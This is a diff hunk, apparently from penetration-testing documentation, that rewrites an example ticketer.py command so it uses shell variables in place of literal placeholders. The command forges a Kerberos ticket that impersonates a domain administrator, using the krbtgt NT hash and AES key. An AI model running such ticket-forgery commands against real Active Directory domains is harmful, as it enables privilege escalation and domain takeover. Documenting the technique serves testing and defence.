@@ -29,11 +29,11 @@ The arguments used to customize the PAC will be ignored (`-groups`, `-extra-sid`
 
 
 ```bash
-ticketer.py -request -impersonate 'domainadmin' \
--domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' \
--nthash 'krbtgt NT hash' -aesKey 'krbtgt AES key' \
--user-id '1115' -domain-sid 'S-1-5-21-...' \
-'baduser'
+ticketer.py -request -impersonate "$ADMIN_USER" \
+-domain "$DOMAIN" -user "$USER" -password "$PASSWORD" \
+-nthash "$KRBTGT_NT_HASH" -aesKey "$KRBTGT_AES_KEY" \
+-user-id "$USER_ID" -domain-sid "$DOMAIN_SID" \
+"$TARGET_USER"
 ```
 
 
